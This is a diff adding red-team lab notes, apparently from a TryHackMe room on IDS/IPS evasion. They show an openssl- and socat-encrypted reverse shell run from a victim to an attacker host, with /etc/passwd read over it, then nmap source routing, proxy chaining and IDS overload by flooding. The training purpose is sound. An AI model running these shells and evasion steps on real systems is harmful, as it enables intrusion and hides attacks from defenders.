@@ -1,0 +1,162 @@
+****Evasion via Payload Manipulation****
+
+
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+
+The arguments in the above command are:
+
+    req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
+    -x509 specifies that we want an X.509 certificate
+    -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048.)
+    -days 365 shows that the validity of our certificate will be one year
+    -subj sets data, such as organization and country, via the command-line.
+    -nodes simplifies our command and does not encrypt the private key
+    -keyout PRIVATE_KEY specifies the filename where we want to save our private key
+    -out CERTIFICATE specifies the filename to which we want to write the certificate request
+
+The above command returns:
+
+    Private key: thm-reverse.key
+    Certificate: thm-reverse.crt
+
+
+
+
+
+The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files. We can use cat to create our PEM file from the two files that we have just created:
+
+cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+
+
+
+
+
+socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+
+If you are not familiar with socat, the options that we used are:
+
+    -d -d provides some debugging data (fatal, error, warning, and notice messages)
+    OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
+    cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
+    verify=0 disables checking peer’s certificate
+    fork creates a sub-process to handle each new connection.
+
+
+
+
+Thirdly, on the victim system, socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash. Note that the EXEC invokes the specified program.
+
+Let’s demonstrate this. On the attacker system, we carried out the following:
+           
+pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+Generating a RSA private key
+........................++++
+......++++
+writing new private key to 'thm-reverse.key'
+-----
+pentester@TryHackMe$ ls
+thm-reverse.crt  thm-reverse.key
+pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
+2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
+
+        
+
+
+
+As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:
+           
+pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
+
+
+
+
+
+
+Back to the attacker system, let’s run cat /etc/passwd:
+
+           
+pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+[...]
+2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+[...]
+
+        
+
+
+
+
+
+****Evasion via Route Manipulation****
+
+
+Relying on Source Routing
+
+In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options. Nmap offers loose and strict routing:
+
+    Loose routing can be specified using L. For instance, --ip-options "L 10.10.10.50 10.10.50.250" requests that your scan packets are routed through the two provided IP addresses.
+    Strict routing can be specified using S. Strict routing requires you to set every hop between your system and the target host. For instance, --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3" specifies that the packets go via these three hops before reaching the target host.
+
+
+
+Using Proxy Servers
+
+The use of proxy servers can help hide your source. Nmap offers the option --proxies that takes a list of a comma-separated list of proxy URLs. 
+Each URL should be expressed in the format proto://host:port. Valid protocols are HTTP and SOCKS4;
+
+Consider the following example. Instead of running nmap -sS 10.10.145.75, you would edit your Nmap command to something like nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 10.10.145.75. 
+This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. 
+It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source.
+
+
+
+
+
+
+Evasion via tactical DoS
+
+An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can:
+
+    Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
+    Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
